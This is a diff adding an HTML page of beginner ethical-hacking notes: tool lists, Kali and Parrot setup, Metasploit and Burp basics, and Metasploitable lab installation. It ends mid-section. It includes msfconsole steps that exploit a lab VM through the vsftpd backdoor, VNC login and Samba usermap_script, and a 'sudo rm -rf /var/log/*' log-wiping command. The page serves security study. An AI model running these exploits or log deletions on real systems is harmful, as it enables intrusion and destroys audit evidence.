@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Ethical Hacking</title>
+   <!-- Prism CSS theme -->
+   <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+   <!-- Prism core + language support -->
+   <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+
+   <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+
+<body>
+   <div class="container">
+      <!--Menu Icon -->
+      <div class="menu-icon" onclick="toggleMenu()">
+         <img src="assets/icons/menu.svg" alt="Menu Icon">
+      </div>
+
+
+
+      <!-- Topics Section -->
+      <div class="left-column" id="left-column">
+         <div class="home-button">
+            <a href="index.html" title="Go to Home">
+               <img src="assets/icons/home.ico" alt="Home" class="home-icon">
+            </a>
+         </div>
+
+         <ul class="topics-list">
+            <li><a href="0Intro.html">Introduction to Cyber Security</a></li>
+            <li><a href="1Reconnaissance.html">Reconnaissance(Info gathering) Phase</a></li>
+            <li><a href="2scanning.html">Scanning Phase</a></li>
+            <li><a href="3Gaining_Access.html">Gaining Access Phase</a></li>
+            <li><a href="4Maintaining_Access.html">Maintaining Access</a></li>
+            <li><a href="5Clearing_Tracks.html">Clearing Tracks</a></li>
+            <li><a href="6Analysis_and_Reporting.html">Analysis and Reporting</a></li>
+            <li><a href="AI_tools.html">Cyber security with AI & ML</a></li>
+            <li><a href="Bug-bounty-hunting.html">Bug Bounty Hunting</a></li>
+            <li><a href="cryptography.html">Cryptography</a></li>
+            <li><a href="CTF_challenges.html">Capture The Flag(CTF) Challenges</a></li>
+            <li><a href="dfir.html">Digital Forensics & Incident Response (DFIR)</a></li>
+            <li><a href="Malware_analysis.html">Malware Analysis</a></li>
+            <li><a href="post_exploitation.html">Post Exploitation Phase</a></li>
+            <li><a href="Reverse_engineering.html">Reverse Engineering</a></li>
+         </ul>
+      </div>
+
+      <!-- Book Content Section -->
+      <div class="right-column" id="right-column">
+         <div class="page" id="book-page">
+            <div class="book-content" id="book-content">
+               <h2>Ethical Hacking</h2>
+
+               <p>Ethical hacking is a practice of identifying and exposing
+                  vulnerabilities in computer systems, networks or applications to improve
+                  their security.</p>
+
+               <h2>Quick tips for beginners </h2>
+               <p> 📌Understand first then hack.
+                  <br>📌Don’t get intimidated by a scope, break it down into functions.
+                  <br>📌Don’t assume everything has been found.
+                  <br>📌Look for lesser known features.
+                  <br>📌Consistency is key to survival.
+                  <br>📌Your most powerful tool is patience. -
+                  <br>📌Hacking is 99% boredom, 1% terror.
+                  <br>📌Don’t learn to hack, hack to learn.
+               </p>
+
+               <h2 id="ethics-legal-considerations">Ethics &amp; legal
+                  considerations </h2>
+               <ol type="1">
+                  <li>Computer fraud and abuse Act (CFAA)</li>
+                  <li>International Telecommunication Union(ITU)</li>
+                  <li>NSO</li>
+                  <li>The Children Online Privacy Protection Act</li>
+               </ol>
+               <h2 id="security-operations">Security operations </h2>
+               <ul>
+                  <li>Detection </li>
+                  <li>Protection </li>
+                  <li>Active defense </li>
+                  <li>Data leakages</li>
+                  <li>Incidence response</li>
+                  <li>Vulnerabilities management </li>
+                  <li>SIEM</li>
+                  <li>SOC</li>
+               </ul>
+               <h2>Governance Risk and Compliance (GRC)</h2>
+               <p>Audit</p>
+               <h3>Written Supervisory Procedures(ASPs)</h3>
+               <ul>
+                  <li>Policy</li>
+                  <li>Procedure</li>
+                  <li>Standards</li>
+                  <li>Guidelines</li>
+                  <li>Compliance &amp; enforcement</li>
+               </ul>
+               <hr />
+               <h3>Laws and regulations</h3>
+               <ol type="1">
+                  <li>Federal</li>
+               </ol>
+               <ul>
+                  <li>Computer Incident Response Team</li>
+                  <li>Department of Homeland Security</li>
+                  <li>FBI</li>
+                  <li>INTERPOL</li>
+               </ul>
+               <ol start="2" type="1">
+                  <li>State
+                     <ul>
+                        <li>Country</li>
+                        <li>International relations</li>
+                     </ul>
+                  </li>
+                  <li>Industry specific</li>
+               </ol>
+               <ul>
+                  <li>Private sectors</li>
+                  <li>Public</li>
+                  <li>Open source</li>
+               </ul>
+               <h3>Frameworks &amp; standards.</h3>
+               <ul>
+                  <li>NIST</li>
+                  <li>ISO/IEC</li>
+                  <li>CSF</li>
+                  <li>CIS</li>
+                  <li>RMF</li>
+                  <li>CISA</li>
+                  <li>SANS/CSC</li>
+               </ul>
+
+               <h2>Hacking Motives/goals</h2>
+               <ol type="1">
+                  <li>Challenge - learn</li>
+                  <li>Recognition - bond, acquire</li>
+                  <li>Curiosity - learn</li>
+                  <li>Ideology - political, religious</li>
+                  <li>Greed - money</li>
+                  <li>State-sponsored</li>
+                  <li>Cooperate espionage - spying</li>
+               </ol>
+               <ul>
+                  <li>Attack = Motive + method + vulnerability</li>
+               </ul>
+               <h2 id="elements-of-information-security">Elements of information security</h2>
+               <p>C.I.A triad</p>
+               <ul>
+                  <li>C - Confidentiality</li>
+                  <li>I - Integrity</li>
+                  <li>A - Availability</li>
+               </ul>
+               <p>📌There exists no perfectly secure system.</p>
+               <p>📌 Secrecy is security.</p>
+               <h2>Career development</h2>
+               <ul>
+                  <li>Peer groups</li>
+                  <li>Self study</li>
+                  <li>Conferences</li>
+                  <li>Training</li>
+                  <li>Certifications</li>
+               </ul>
+
+
+
+               <div>
+                  <h3>Jobs in Cyber Security</h3>
+
+                  <div class="job-category">
+                     <h4>Offensive Operations</h4>
+                     <p>Red Team member <br> Pen Tester</p>
+                  </div>
+                  <br> <br>
+
+                  <div class="job-category">
+                     <h4>Defensive Operations</h4>
+                     <p>
+                        Counterespionage Analyst <br>
+                        Cryptanalyst <br>
+                        Cyber Intelligence Specialist <br>
+                        Data Privacy Officer <br>
+                        Data Security Analyst <br>
+                        Industrial Internet of Things (IIoT) Security Specialist <br>
+                        Information Security Analyst <br>
+                        IT Security Architect <br>
+                        Security Operations Center (SOC) Analyst <br>
+                        Security Awareness Training Specialist <br>
+                        Supervisory control and data acquisition (SCADA) Security Analyst
+                     </p>
+                  </div>
+                  <br> <br>
+
+                  <div class="job-category">
+                     <h4>Leadership</h4>
+                     <p>
+                        Chief Security Officer (CSO) <br>
+                        Chief Information Security Officer (CISO) <br>
+                        Security Operations Center (SOC) Manager
+                     </p>
+                  </div>
+                  <br> <br>
+
+                  <div class="job-category">
+                     <h4>Incident Response and Threat Hunting</h4>
+                     <p>
+                        Threat Hunter <br>
+                        Virus Technician <br>
+                        Bug Bounty Hunter <br>
+                        Ethical Hacker <br>
+                        Incident Responder <br>
+                        Malware Analyst <br>
+                        Vulnerability Assessor
+                     </p>
+                  </div>
+                  <br> <br>
+
+                  <div class="job-category">
+                     <h4>Threat Intel and Forensics</h4>
+                     <p>
+                        Cyber Insurance Policy Specialist <br>
+                        Cyber Operations Specialist <br>
+                        Cybercrime Investigator <br>
+                        Cybersecurity Lawyer <br>
+                        Source Code Auditor
+                     </p>
+                  </div>
+                  <br> <br>
+
+               </div>
+
+
+               <h2>Hacker skill levels</h2>
+               <p>Script kiddies(begginer)
+                  <br>Green hat(basic techniques)
+                  <br>Hacker group
+                  <br>Hactivist(advanced techniques)
+                  <br>Botnet hackers
+                  <br>Cyber terrorist
+               </p>
+
+
+               <h2>Hacker skill sets.</h2>
+               <h3>Technical skills</h3>
+               <ul>
+                  <li>Operating system knowledge</li>
+                  <li>Computer Networking skills</li>
+                  <li>Hardware &amp; software capabilities</li>
+                  <li>Past vulnerabilities &amp; attacks</li>
+                  <li>Software development</li>
+               </ul>
+               <h3>Non-technical skills</h3>
+               <ul>
+                  <li>Learning ability</li>
+                  <li>Problem solving skills</li>
+                  <li>Communication skills</li>
+                  <li>Laws &amp; regulations awareness</li>
+               </ul>
+               <h2 id="hacking-competitions.">Hacking competitions.</h2>
+               <ul>
+                  <li>AFA cyberPayriot: uscyberpatriot.org</li>
+                  <li>DEFCON CTF: defcon.org</li>
+                  <li>Deutsche Hacking Meisterschaft: hacking-meisterschaft.de</li>
+                  <li>European Cyber security challenges (ECSC): ecsc.eu</li>
+                  <li>Google CTF: capturetheflag.withgoogle.com</li>
+                  <li>HackerRank: hackerrank.com</li>
+               </ul>
+               <h2 id="types-of-hackers">Types of hackers</h2>
+               <ol type="1">
+                  <li>White hat - Ethical</li>
+                  <li>Grey hat - Neutral</li>
+                  <li>Black hat - Bad guy</li>
+               </ol>
+               <ul>
+                  <li>Red team - attackers</li>
+                  <li>Blue team - defenders</li>
+                  <li>Yellow team - builders</li>
+               </ul>
+
+               <hr />
+
+               <!------------------Phases of Ethical hacking ------------------->
+               <h1 id="phases-of-hacking">Ethical hacking Phases</h1>
+               <ul>
+                  <li>1. Information gathering </li>
+                  <li>2. Scannning and Enumeration</li>
+                  <li>3. Exploitation/Gaining access </li>
+                  <li>4. Post exploitation / Maintaining Access </li>
+                  <li>5. Clearing tracks </li>
+                  <li>6. Analysis and reporting</li>
+               </ul>
+
+               <hr />
+
+               <!------------------ Hacking lab set-up ------------------------->
+               <h1>Hacking Lab set-up.</h1>
+               <h3>Virtual environment.</h3>
+               <ul>
+                  <li>VMware workstation player</li>
+                  <li>Oracle Virtual Box</li>
+                  <li>Windows sandbox</li>
+               </ul>
+               <h3>Operating Systems used by Hackers</h3>
+               <ul>
+                  <li>Kali linux</li>
+                  <li>Parrot</li>
+                  <li>Backbox</li>
+                  <li>Pentoo</li>
+                  <li>DracOS</li>
+                  <li>Cyborg</li>
+                  <li>Deft linux</li>
+                  <li>Backarch</li>
+                  <li>Arch strike</li>
+                  <li>Mobelexr - Mobile apps</li>
+                  <li>Pentest Box</li>
+                  <li>Windows Subsystem for Linux (WSL)</li>
+                  <li>Rooted Mobile phone</li>
+               </ul>
+               <h3>Vulnerable tools</h3>
+               <ul>
+                  <li>Metasploitable 1 &amp; 2</li>
+                  <li>Microsoft Windows 07, 08, 10, 11</li>
+                  <li>Quoar</li>
+                  <li>Sedna</li>
+                  <li>Badstore</li>
+                  <li>OWASP Broken Web Application VM</li>
+                  <li>Hack This Site</li>
+                  <li>Root me</li>
+                  <li>Hacker 101</li>
+                  <li>Capture The Flag 101</li>
+                  <li>Hack-A-Sat</li>
+                  <li>Try hack me</li>
+                  <li>Hack The Box</li>
+               </ul>
+
+
+               <h2 id="essential-tools">Essential tools</h2>
+               <h3 id="reconnaissance-phase">Reconnaissance phase</h3>
+               <ul>
+                  <li>Nmap</li>
+                  <li>Maltego-ng</li>
+                  <li>Recon-ng</li>
+                  <li>Shodan</li>
+                  <li>theHarvester</li>
+               </ul>
+               <h3 id="scanning-and-enumeration">Scanning and enumeration </h3>
+               <ul>
+                  <li>Wireshark</li>
+                  <li>Nessus </li>
+                  <li>Nikto</li>
+                  <li>OpenVAS</li>
+                  <li>Burp Suite</li>
+               </ul>
+               <h3 id="exploitations">Exploitations </h3>
+               <ul>
+                  <li>Metasploit Framework </li>
+                  <li>SQLmap</li>
+                  <li>John the Ripper </li>
+                  <li>Hydra</li>
+                  <li>Aircrack-ng </li>
+               </ul>
+               <h3 id="maintaining-access">Maintaining Access </h3>
+               <ul>
+                  <li>Cobalt strike </li>
+                  <li>Empire</li>
+                  <li>Mimikatz</li>
+                  <li>Netcat</li>
+                  <li>PowerSploit</li>
+               </ul>
+
+
+
+               <!------------------------Kali Linux Operating System ------------------>
+               <div>
+                  <h1>Kali LInux Operating System</h1>
+                  <h2>Optimize/ Customize Kali Linux.</h2>
+                  <p>✅ Optimized performance (faster boot, reduced RAM usage)</p>
+                  <p>✅ Reduced storage (removed unneeded tools)</p>
+                  <p>✅ Customized networking &amp; security settings.</p>
+                  <p>❌ Kernel &amp; system updates might introduce new settings that need re-tweaking.</p>
+                  <p>❌ DNS and network settings might be reset unless locked.</p>
+
+                  <h3>Use a Lightweight Desktop Environment i.e LXQt, Openbox, or i3 etc</h3>
+                  <p>Install LXQt (Lightweight alternative to XFCE)</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                  $sudo apt install kali-desktop-lxqt -y
+                  $sudo apt install openbox obconf obmenu -y
+                  $sudo apt remove --purge kali-desktop-xfce -y
+                  $sudo apt autoremove -y
+                    </code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Remove Unnecessary Tools &amp; Packages</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+
+                  $dpkg --get-selections | grep kali
+                  $sudo apt remove --purge kali-linux-forensic kali-linux-voip kali-linux-wireless -y
+                  $sudo apt autoremove -y
+                    </code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>To remove all Kali pre-installed tools and keep only the essentials:</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                  $sudo apt remove --purge kali-linux-default -y
+                  $sudo apt autoremove -y
+                    </code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+                  <p>📌If you only need specific tools, install them manually instead.</p>
+
+
+                  <h3>Reduce Background Services &amp; Daemons</h3>
+                  <p>Check Running Services</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                  $systemctl list-unit-files --type=service | grep enabled
+                     </code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>Disable Unnecessary Services</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash"> 
+                        $sudo systemctl disable $bluetooth.service
+                        $sudo systemctl stop bluetooth.service</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+
+                  <p>Disable NetworkManager-wait-online, which can slow down boot times</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                  $sudo systemctl disable NetworkManager-wait-online.service</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <h3>Optimize Storage &amp; Clean Up Junk Files</h3>
+
+                  <p>Remove Old Dependencies &amp; Cached Packages</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $sudo apt autoremove -y
+                           $sudo apt clean -y
+                        $sudo apt autoclean -y</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Delete Log Files</p>
+                  <div>
+                     <pre><code>$sudo rm -rf /var/log/*</code></pre>
+                  </div>
+
+                  <p>Check for Large Unused Files &amp; clear it:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                        $du -sh /var/cache/apt
+                        $sudo rm -rf /var/cache/apt/archives/*</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+
+                  <p>Reduce RAM Usage &amp; Improve Performance</p>
+                  <p>Use ZRAM (Compressed Swap in RAM)</p>
+
+                  <div class="code-block">
+                     <pre><code>
+                        $sudo apt install zram-tools -y
+                        $sudo systemctl enable --now zramswap.service</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Reduce Swappiness</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $echo &#39;vm.swappiness=10&#39; | sudo tee -a /etc/sysctl.conf
+                     $sudo sysctl -p</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <h3>Optimize Boot Speed</h3>
+                  <p>Disable Unnecessary Boot Services</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                        $systemctl list-unit-files --type=service --state=enabled</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Disable unnecessary services</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $sudo systemctl disable &lt;service-name&gt;</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>Use Systemd-analyze to Check Boot Time</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $systemd-analyze
+                     $systemd-analyze blame</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <h3>Optimize Network &amp; DNS for Faster Browsing</h3>
+                  <p>Use a Fast DNS Resolver, Edit /etc/resolv.conf:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                        $sudo nano /etc/resolv.conf</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Replace with: nameserver 1.1.1.1 nameserver 8.8.8.8</p>
+                  <p>Then, prevent automatic changes:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $sudo chattr +i /etc/resolv.conf</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <h3>Install a Lighter Terminal Emulator</h3>
+                  <p>Instead of using GNOME Terminal, switch to Alacritty or Kitty:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                              $sudo apt install alacritty -y</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+
+                  <p>Use a Minimal Kernel (Optional)</p>
+                  <p>You can install a minimal kernel for lower RAM usage:</p>
+                  <div class="code-block">
+                     <pre><code>
+                        $sudo apt install linux-image-rt-amd64 -y</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Reboot your system to apply all optimizations:</p>
+                  <div class="code-block">
+                     <pre><code>$sudo reboot</code></pre>
+                  </div>
+
+
+                  <p>📌Reduced Storage Usage by removing unnecessary packages</p>
+                  <p>📌Faster Boot Time by disabling unneeded services</p>
+                  <p>📌Lower RAM Usage with ZRAM and swappiness tuning</p>
+                  <p>📌Improved Network Speed with optimized DNS</p>
+
+                  <hr>
+
+                  <h2>Custom Kali Linux ISO</h2>
+                  <p>Install live-build and Dependencies</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $sudo apt update &amp;&amp; 
+                           $sudo apt install -y live-build cdebootstrap curl git</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Clone the Kali Linux ISO Builder</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git
+                     $cd live-build-config</code></pre>
+                  </div>
+
+
+                  <p>Remove Unnecessary Packages</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $nano kali-config/variant-default/package-lists/kali.list.chroot</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Remove unnecessary tools: Delete lines for forensics, VoIP, and wireless tools if you don’t need
+                     them.</p>
+                  <p>Add performance tools: Add ZRAM, a lightweight terminal, and network optimizations etc</p>
+                  <div class="code-block">
+                     <pre><code>
+                           zram-tools
+                           Alacritty
+                           Resolvconf
+                     </code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+                  <p>Save and exit (CTRL + X, then Y, then ENTER).</p>
+
+
+                  <h2>Optimize System Settings</h2>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $nano kali-config/common/includes.chroot/etc/sysctl.conf</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Add:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     vm.swappiness=10
+                     fs.inotify.max_user_watches=524288
+                     net.core.default_qdisc=fq
+                     net.ipv4.tcp_congestion_control=bbr</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+                  <p>Save and exit.</p>
+
+
+                  <h2>Customize Boot Services</h2>
+                  <p>Disable unnecessary services by creating a script</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $nano kali-config/common/hooks/00-disable-services.chroot</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>Add:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     #!/bin/bash
+                     systemctl disable bluetooth.service
+                     systemctl disable NetworkManager-wait-online.service
+                     systemctl disable ModemManager.service</code></pre>
+                  </div>
+
+                  <p>Save, then make it executable:</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                     $chmod +x kali-config/common/hooks/00-disable-services.chroot</code></pre>
+                  </div>
+
+
+                  <h2>Build the Custom ISO</h2>
+                  <p>Run the following command to start the ISO build process:</p>
+                  <div class="code-block">
+                     <pre><code>
+                        $sudo ./build.sh --variant default --verbose</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+                  <p>This will take some time depending on your system's performance.</p>
+                  <p>Test Your Custom Kali ISO</p>
+                  <p>Once the build is done, find your ISO in the images/ folder</p>
+                  <div class="code-block">
+                     <pre><code>$ls -lh images/</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+                  <p>Now, test it in VMware or VirtualBox:</p>
+                  <p>Create a new VM and select your custom ISO as the installation medium.</p>
+
+               </div>
+               <hr />
+
+
+
+
+
+               <!-----------------Parrot OS--------------------------------->
+
+               <div class="tool">
+                  <h1>Parrot Security OS.</h1>
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                  $sudo su
+                  $passwd root
+                  $sudo apt update &amp;&amp; apt upgrade -y</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <h3>Install your preferred media player i.e media codecs</h3>
+                  <p>Install graphics drivers i.e nividia</p>
+                  <p>Install parrot metapackages</p>
+
+                  <div class="code-block">
+                     <pre><code class="language-bash">
+                           $sudo apt install parrot-tools-full</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+
+                  <p>Install your preffered penetration testing tools i.e
+                     <br>Angry IP scanner
+                     <br>Nessus
+                  </p>
+
+
+
+
+               </div>
+
+               <hr />
+
+               <!-----------------------Metasploit Framwork ----------------->
+
+               <div>
+                  <h1></h1>Metasploit Framework </h1>
+                  <h3>Components of MF</h3>
+                  <p>1.Exploit <br> 2.Payload <br> 3.Modules <br> 4.Listeners <br> 5.Shellcodes</p>
+                  <h3>Utilities</h3>
+                  <ol type="1">
+                     <li>Msfpayload - generate shellcodes, executables</li>
+                     <li>MSFencode - evade antivirus</li>
+                     <li>Nasm shell - identify opcodes(assembly instructions)</li>
+                  </ol>
+                  <p>Metasploit Interfaces <br> 1. MsfConsole <br> 2. Armitage - GUI</p>
+                  <div class="code-block">
+                     <pre><code class="language-bash">   
+                     $sudo apt install armitage
+                     $service postresql start
+                     $sudo armitage
+                     $service metasploit start</code></pre>
+                     <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                  </div>
+
+                  <p>Metasploit express - web interface</p>
+                  <p>Meterpreter - remote shell</p>
+
+
+                  <!--------------Burp Suite Framework ----------------->
+                  <div class="too">
+                     <h1>BurpSuite Framework</h1>
+                     <ul>
+                        <li>Download from <a href="portswigger.net">Portswigger site</a></li>
+                     </ul>
+                     <h2 id="burp-configuration">Burp configuration</h2>
+                     <p>Firefox Setting &gt;&gt; Network Settings &gt;&gt; Manual Proxy
+                        127.0.0.1:8080</p>
+                     <p>BurpSuite proxy  &gt;&gt; Proxy Settings &gt;&gt; Certificate
+                        (burp_cert.cre)  Firefox settings &gt;&gt; Advanced Tab &gt;&gt; View
+                        Certificates &gt;&gt; Authorities &gt;&gt; Import</p>
+                     <h2 id="sections-of-burp-suite">Sections of burp suite</h2>
+                     <ol type="1">
+                        <li>Target section - victim </li>
+                     </ol>
+                     <ul>
+                        <li>Sitemap</li>
+                        <li>Scope</li>
+                     </ul>
+                     <ol start="2" type="1">
+                        <li>Proxy section - requests &amp; responses</li>
+                     </ol>
+                     <ul>
+                        <li>Intercept </li>
+                        <li>HTTP history </li>
+                        <li>Web sockets </li>
+                     </ul>
+                     <ol start="3" type="1">
+                        <li>Repeater section - manual test</li>
+                     </ol>
+                     <ul>
+                        <li>Requests</li>
+                        <li>Response </li>
+                     </ul>
+                     <ol start="4" type="1">
+                        <li>Intruder section - health automata</li>
+                     </ol>
+                     <ul>
+                        <li>Targets </li>
+                        <li>Positions</li>
+                        <li>Payloads</li>
+                     </ul>
+                     <ol start="5" type="1">
+                        <li>Sequencer - randomness</li>
+                     </ol>
+                     <ul>
+                        <li>Cookies</li>
+                        <li>Tokens</li>
+                     </ul>
+                     <ol start="6" type="1">
+                        <li>
+                           <p>Scanner - automated scanning </p>
+                        </li>
+                        <li>
+                           <p>Spider</p>
+                        </li>
+                        <li>
+                           <p>Decoder - encode &amp; decode</p>
+                        </li>
+                     </ol>
+                     <ul>
+                        <li>HTML </li>
+                        <li>Base64</li>
+                        <li>ASCII hex</li>
+                        <li>hex, ictal, binary</li>
+                        <li>Gzip</li>
+                     </ul>
+                     <ol start="9" type="1">
+                        <li>Scanner </li>
+                        <li>Comparer</li>
+                        <li>Extender</li>
+                     </ol>
+                     <ul>
+                        <li>write custom extension, plugins</li>
+                     </ul>
+                     <ol start="12" type="1">
+                        <li>Options</li>
+                        <li>Alert</li>
+                     </ol>
+
+
+
+                  </div>
+
+                  <!-------------------------Metasploitable 3 ------------------------------->
+
+                  <div id="metasploitable-3">
+                     <h1>Metasploitable 3</h1>
+                     <p>System requirements <br>65 GB available disk space <br>4.5 GB RAM
+                        <br> Vagrant
+                        <br> Vagrant reload plugin
+                        <br>Packer
+                        <br>Git clone metasploitable 3
+                     </p>
+
+                     <h2>Installation of metasploitable 3</h2>
+                     <p>Vmware</p>
+                     <div class="code-block">
+                        <pre><code class="language-bash">
+                        &gt;Vagrant plugin install vagrant-vmware-desktop
+                        &gt;vagrant plugin install vagrant-reload
+                        &gt;vagrant box list
+                        &gt;vagrant box add rapid7/metasploitable3-win2k8 --provider vmware_desktop
+                        &gt;vagrant box remove rapid7/metasploitable3-ub1404 --provider vmware_desktop
+                        &gt;vagrant up OR &gt;vagrant up win2k8</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+
+                     <p>In vagrant directrory</p>
+                     <div class="code-block">
+                        <pre><code class="language-bash">
+                        &gt;slmgr /rearm
+                        &gt;. \build.ps1
+                         &gt;. \build.ps1 windows2008 or Ubuntu 1404</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+
+                     <p>Virtual box</p>
+                     <div class="code-block">
+                        <pre><code class="language-bash">
+                           &gt;vagrant plugin install vagrant-vbguest
+                           &gt;vagrant plugin install vagrant-reload
+                           &gt;set-ExecutionPolicy Unrestricted
+                           &gt;.\build.ps1
+                           &gt;.\build.ps1 windows2008 or Ubuntu 1404</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+
+                     <p>OR</p>
+                     <div class="code-block">
+                        <pre><code>
+                           &gt;. \packer.exe build. \windows_10_choco.json
+                           &gt;Vagrant box add win10 windows_10_virtualbox.box
+                           &gt;cd win10
+                           &gt;vagrant init win10
+                           &gt;vagrant up</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+                     <p>📌Default credentials are Username: Vagrant password : vagrant</p>
+                     <hr />
+
+
+                  </div>
+
+                  <!----------------------Metasploitable 2 --------------------------->
+
+                  <div>
+
+                     <h1>Metasploitable 2.</h1>
+                     <p>Official website: <a href="rapid7.com/products/">Rapid 7
+                           website</a></p>
+                     <h3 id="system-requirements">System requirements </h3>
+                     <ul>
+                        <li>
+                           <p>Windows 7/8/10/11</p>
+                        </li>
+                        <li>
+                           <p>VT-x/AMD-V supported processor</p>
+                        </li>
+                        <li>
+                           <p>Minimum of 30GB HDD space</p>
+                        </li>
+                        <li>
+                           <p>Minimum of 4GB RAM</p>
+                        </li>
+                        <li>
+                           <p>Default credentions are Username: msfadmin  and Password:
+                              msfadmin</p>
+                        </li>
+                     </ul>
+                     <h2>Components of metasplotable 2</h2>
+                     <ul>
+                        <li>TWiki</li>
+                        <li>phpMyAdmin</li>
+                        <li>Multilidae</li>
+                        <li>DVWA</li>
+                        <li>WebDAV</li>
+                     </ul>
+
+                     <h2>Penetration testing on metasploitable 2</h2>
+                     <div class="code-block">
+                        <pre><code class="language-absh">
+                        $ifconfig #run this on target machine (metasploitable 2)
+                        $nmap -sV -O 172.16.225.128
+                        $msfconsole</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+                     <h2>Very Secure FTP exploitaion</h2>
+                     <div class="code-block">
+                        <pre><code>
+                           $msfconsole
+                           msf6&gt;search vsftpd
+                           msf6&gt;use exploit/unix/ftp/vsftpd_234_backdoor
+                           msf6&gt;set RHOST 172.16.225.128
+                           msf6&gt;run</code></pre>
+                        <p>metepreter&gt;whoami</p>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+                     <h2>VNC Remote Login Exploitation</h2>
+                     <div class="code-block">
+                        <pre><code class="language-bash">
+                           $msfconsole
+                           &gt;search vnc login
+                           &gt;use auxiliary/scanner/vnc/vnc_login
+                           &gt;set RHOST 172.16.225.128
+                           &gt;run
+                           $vncviewer 172.16.225.128</code></pre>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                     </div>
+
+                     <h2>Samba server exploitation</h2>
+                     <div class="code-block">
+                        <pre><code>$msfconsole
+&gt;search usermap script
+&gt;exploit/multi/samba/usermap_script
+&gt;set RHOST 172.16.225.128
+&gt;exploit</code></pre>
+                        <p>metepreter&gt;whoami</p>
